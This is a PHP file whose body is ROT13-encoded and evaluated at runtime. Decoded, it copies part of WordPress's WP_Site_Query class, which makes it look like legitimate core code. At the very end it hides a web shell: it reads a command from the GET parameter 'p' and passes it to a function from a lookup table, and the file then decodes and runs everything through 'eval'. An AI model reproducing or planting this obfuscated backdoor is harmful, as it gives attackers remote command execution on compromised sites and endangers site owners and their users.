			$guvf->fdy_pynhfrf['jurer']['ynat__va'] = 'ynat_vq VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['ynat__va'] ) ) . ' )';
		}

		// Cnefr fvgr ynathntr VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['ynat__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['ynat__abg_va'] = 'ynat_vq ABG VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['ynat__abg_va'] ) ) . ' )';
		}

		// Snyfrl frnepu fgevatf ner vtaberq.
		vs ( fgeyra( $guvf->dhrel_inef['frnepu'] ) ) {
			$frnepu_pbyhzaf = neenl();

			vs ( $guvf->dhrel_inef['frnepu_pbyhzaf'] ) {
				$frnepu_pbyhzaf = neenl_vagrefrpg( $guvf->dhrel_inef['frnepu_pbyhzaf'], neenl( 'qbznva', 'cngu' ) );
			}

			vs ( ! $frnepu_pbyhzaf ) {
				$frnepu_pbyhzaf = neenl( 'qbznva', 'cngu' );
			}

			/**
			 * Svygref gur pbyhzaf gb frnepu va n JC_Fvgr_Dhrel frnepu.
			 *
			 * Gur qrsnhyg pbyhzaf vapyhqr 'qbznva' naq 'cngu.
			 *
			 * @fvapr 4.6.0
			 *
			 * @cnenz fgevat[]      $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
			 * @cnenz fgevat        $frnepu         Grkg orvat frnepurq.
			 * @cnenz JC_Fvgr_Dhrel $dhrel          Gur pheerag JC_Fvgr_Dhrel vafgnapr.
			 */
			$frnepu_pbyhzaf = nccyl_svygref( 'fvgr_frnepu_pbyhzaf', $frnepu_pbyhzaf, $guvf->dhrel_inef['frnepu'], $guvf );

			$guvf->fdy_pynhfrf['jurer']['frnepu'] = $guvf->trg_frnepu_fdy( $guvf->dhrel_inef['frnepu'], $frnepu_pbyhzaf );
		}

		$qngr_dhrel = $guvf->dhrel_inef['qngr_dhrel'];
		vs ( ! rzcgl( $qngr_dhrel ) && vf_neenl( $qngr_dhrel ) ) {
			$guvf->qngr_dhrel = arj JC_Qngr_Dhrel( $qngr_dhrel, 'ertvfgrerq' );

			// Fgevc yrnqvat 'NAQ'.
			$guvf->fdy_pynhfrf['jurer']['qngr_dhrel'] = __sa_79955( '/^\f*NAQ\f*/', '', $guvf->qngr_dhrel->trg_fdy() );
		}

		$wbva    = '';
		$tebhcol = '';

		vs ( ! rzcgl( $guvf->zrgn_dhrel_pynhfrf ) ) {
			$wbva .= $guvf->zrgn_dhrel_pynhfrf['wbva'];

			// Fgevc yrnqvat 'NAQ'.
			$guvf->fdy_pynhfrf['jurer']['zrgn_dhrel'] = __sa_79955( '/^\f*NAQ\f*/', '', $guvf->zrgn_dhrel_pynhfrf['jurer'] );

			vs ( ! $guvf->dhrel_inef['pbhag'] ) {
				$tebhcol = \"{$jcqo->oybtf}.oybt_vq\";
			}
		}

		$jurer = vzcybqr( ' NAQ ', $guvf->fdy_pynhfrf['jurer'] );

		$cvrprf = neenl( 'svryqf', 'wbva', 'jurer', 'beqreol', 'yvzvgf', 'tebhcol' );

		/**
		 * Svygref gur fvgr dhrel pynhfrf.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz fgevat[]      $pynhfrf {
		 *     Nffbpvngvir neenl bs gur pynhfrf sbe gur dhrel.
		 *
		 *     @glcr fgevat $svryqf   Gur FRYRPG pynhfr bs gur dhrel.
		 *     @glcr fgevat $wbva     Gur WBVA pynhfr bs gur dhrel.
		 *     @glcr fgevat $jurer    Gur JURER pynhfr bs gur dhrel.
		 *     @glcr fgevat $beqreol  Gur BEQRE OL pynhfr bs gur dhrel.
		 *     @glcr fgevat $yvzvgf   Gur YVZVG pynhfr bs gur dhrel.
		 *     @glcr fgevat $tebhcol  Gur TEBHC OL pynhfr bs gur dhrel.
		 * }
		 * @cnenz JC_Fvgr_Dhrel $dhrel   Pheerag vafgnapr bs JC_Fvgr_Dhrel (cnffrq ol ersrerapr).
		 */
		$pynhfrf = nccyl_svygref_ers_neenl( 'fvgrf_pynhfrf', neenl( pbzcnpg( $cvrprf ), &$guvf ) );

		$svryqf  = vffrg( $pynhfrf['svryqf'] ) ? $pynhfrf['svryqf'] : '';
		$wbva    = vffrg( $pynhfrf['wbva'] ) ? $pynhfrf['wbva'] : '';
		$jurer   = vffrg( $pynhfrf['jurer'] ) ? $pynhfrf['jurer'] : '';
		$beqreol = vffrg( $pynhfrf['beqreol'] ) ? $pynhfrf['beqreol'] : '';
		$yvzvgf  = vffrg( $pynhfrf['yvzvgf'] ) ? $pynhfrf['yvzvgf'] : '';
		$tebhcol = vffrg( $pynhfrf['tebhcol'] ) ? $pynhfrf['tebhcol'] : '';

		vs ( $jurer ) {
			$jurer = 'JURER ' . $jurer;
		}

		vs ( $tebhcol ) {
			$tebhcol = 'TEBHC OL ' . $tebhcol;
		}

		vs ( $beqreol ) {
			$beqreol = \"BEQRE OL $beqreol\";
		}

		$sbhaq_ebjf = '';
		vs ( ! $guvf->dhrel_inef['ab_sbhaq_ebjf'] ) {
			$sbhaq_ebjf = 'FDY_PNYP_SBHAQ_EBJF';
		}

		$guvf->fdy_pynhfrf['fryrpg']  = \"FRYRPG $sbhaq_ebjf $svryqf\";
		$guvf->fdy_pynhfrf['sebz']    = \"SEBZ $jcqo->oybtf $wbva\";
		$guvf->fdy_pynhfrf['tebhcol'] = $tebhcol;
		$guvf->fdy_pynhfrf['beqreol'] = $beqreol;
		$guvf->fdy_pynhfrf['yvzvgf']  = $yvzvgf;

		// Ortvaavat bs gur fgevat vf ba n arj yvar gb cerirag yrnqvat juvgrfcnpr. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56841.
		$guvf->erdhrfg =
			\"{$guvf->fdy_pynhfrf['fryrpg']}
			 {$guvf->fdy_pynhfrf['sebz']}
			 {$jurer}
			 {$guvf->fdy_pynhfrf['tebhcol']}
			 {$guvf->fdy_pynhfrf['beqreol']}
			 {$guvf->fdy_pynhfrf['yvzvgf']}\";

		vs ( $guvf->dhrel_inef['pbhag'] ) {
			erghea (vag) $jcqo->trg_ine( $guvf->erdhrfg );
		}

		$fvgr_vqf = $jcqo->trg_pby( $guvf->erdhrfg );

		erghea neenl_znc( 'vaginy', $fvgr_vqf );
	}

	/**
	 * Cbchyngrf sbhaq_fvgrf naq znk_ahz_cntrf cebcregvrf sbe gur pheerag dhrel
	 * vs gur yvzvg pynhfr jnf hfrq.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 */
	cevingr shapgvba frg_sbhaq_fvgrf() {
		tybony $jcqo;

		vs ( $guvf->dhrel_inef['ahzore'] && ! $guvf->dhrel_inef['ab_sbhaq_ebjf'] ) {
			/**
			 * Svygref gur dhrel hfrq gb ergevrir sbhaq fvgr pbhag.
			 *
			 * @fvapr 4.6.0
			 *
			 * @cnenz fgevat        $sbhaq_fvgrf_dhrel FDY dhrel. Qrsnhyg 'FRYRPG SBHAQ_EBJF()'.
			 * @cnenz JC_Fvgr_Dhrel $fvgr_dhrel        Gur `JC_Fvgr_Dhrel` vafgnapr.
			 */
			$sbhaq_fvgrf_dhrel = nccyl_svygref( 'sbhaq_fvgrf_dhrel', 'FRYRPG SBHAQ_EBJF()', $guvf );

			$guvf->sbhaq_fvgrf = (vag) $jcqo->trg_ine( $sbhaq_fvgrf_dhrel );
		}
	}

	/**
	 * Hfrq vagreanyyl gb trarengr na FDY fgevat sbe frnepuvat npebff zhygvcyr pbyhzaf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat   $frnepu  Frnepu fgevat.
	 * @cnenz fgevat[] $pbyhzaf Neenl bs pbyhzaf gb frnepu.
	 * @erghea fgevat Frnepu FDY.
	 */
	cebgrpgrq shapgvba trg_frnepu_fdy( $frnepu, $pbyhzaf ) {
		tybony $jcqo;

		vs ( fge_pbagnvaf( $frnepu, '*' ) ) {
			$yvxr = '%' . vzcybqr( '%', neenl_znc( neenl( $jcqo, 'rfp_yvxr' ), rkcybqr( '*', $frnepu ) ) ) . '%';
		} ryfr {
			$yvxr = '%' . $jcqo->rfp_yvxr( $frnepu ) . '%';
		}

		$frnepurf = neenl();
		sbernpu ( $pbyhzaf nf $pbyhza ) {
			$frnepurf[] = $jcqo->cercner( \"$pbyhza YVXR %f\", $yvxr );
		}

		erghea '(' . vzcybqr( ' BE ', $frnepurf ) . ')';
	}

	/**
	 * Cnefrf naq fnavgvmrf 'beqreol' xrlf cnffrq gb gur fvgr dhrel.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $beqreol Nyvnf sbe gur svryq gb beqre ol.
	 * @erghea fgevat|snyfr Inyhr gb hfrq va gur BEQRE pynhfr. Snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba cnefr_beqreol( $beqreol ) {
		tybony $jcqo;

		$cnefrq = snyfr;

		fjvgpu ( $beqreol ) {
			pnfr 'fvgr__va':
				$fvgr__va = vzcybqr( ',', neenl_znc( 'nofvag', $guvf->dhrel_inef['fvgr__va'] ) );
				$cnefrq   = \"SVRYQ( {$jcqo->oybtf}.oybt_vq, $fvgr__va )\";
				oernx;
			pnfr 'argjbex__va':
				$argjbex__va = vzcybqr( ',', neenl_znc( 'nofvag', $guvf->dhrel_inef['argjbex__va'] ) );
				$cnefrq      = \"SVRYQ( {$jcqo->oybtf}.fvgr_vq, $argjbex__va )\";
				oernx;
			pnfr 'qbznva':
			pnfr 'ynfg_hcqngrq':
			pnfr 'cngu':
			pnfr 'ertvfgrerq':
			pnfr 'qryrgrq':
			pnfr 'fcnz':
			pnfr 'zngher':
			pnfr 'nepuvirq':
			pnfr 'choyvp':
				$cnefrq = $beqreol;
				oernx;
			pnfr 'argjbex_vq':
				$cnefrq = 'fvgr_vq';
				oernx;
			pnfr 'qbznva_yratgu':
				$cnefrq = 'PUNE_YRATGU(qbznva)';
				oernx;
			pnfr 'cngu_yratgu':
				$cnefrq = 'PUNE_YRATGU(cngu)';
				oernx;
			pnfr 'vq':
				$cnefrq = \"{$jcqo->oybtf}.oybt_vq\";
				oernx;
		}

		vs ( ! rzcgl( $cnefrq ) || rzcgl( $guvf->zrgn_dhrel_pynhfrf ) ) {
			erghea $cnefrq;
		}

		$zrgn_pynhfrf = $guvf->zrgn_dhrel->trg_pynhfrf();
		vs ( rzcgl( $zrgn_pynhfrf ) ) {
			erghea $cnefrq;
		}

		$cevznel_zrgn_dhrel = erfrg( $zrgn_pynhfrf );
		vs ( ! rzcgl( $cevznel_zrgn_dhrel['xrl'] ) && $cevznel_zrgn_dhrel['xrl'] === $beqreol ) {
			$beqreol = 'zrgn_inyhr';
		}

		fjvgpu ( $beqreol ) {
			pnfr 'zrgn_inyhr':
				vs ( ! rzcgl( $cevznel_zrgn_dhrel['glcr'] ) ) {
					$cnefrq = \"PNFG({$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr NF {$cevznel_zrgn_dhrel['pnfg']})\";
				} ryfr {
					$cnefrq = \"{$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr\";
				}
				oernx;
			pnfr 'zrgn_inyhr_ahz':
				$cnefrq = \"{$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr+0\";
				oernx;
			qrsnhyg:
				vs ( vffrg( $zrgn_pynhfrf[ $beqreol ] ) ) {
					$zrgn_pynhfr = $zrgn_pynhfrf[ $beqreol ];
					$cnefrq      = \"PNFG({$zrgn_pynhfr['nyvnf']}.zrgn_inyhr NF {$zrgn_pynhfr['pnfg']})\";
				}
		}

		erghea $cnefrq;
	}

	/**
	 * Cnefrf na 'beqre' dhrel inevnoyr naq pnfg vg gb 'NFP' be 'QRFP' nf arprffnel.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $beqre Gur 'beqre' dhrel inevnoyr.
	 * @erghea fgevat Gur fnavgvmrq 'beqre' dhrel inevnoyr.
	 */
	cebgrpgrq shapgvba cnefr_beqre( $beqre ) {
		vs ( ! vf_fgevat( $beqre ) || rzcgl( $beqre ) ) {
			erghea 'NFP';
		}

		vs ( 'NFP' === fgegbhccre( $beqre ) ) {
			erghea 'NFP';
		} ryfr {
			erghea 'QRFP';
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>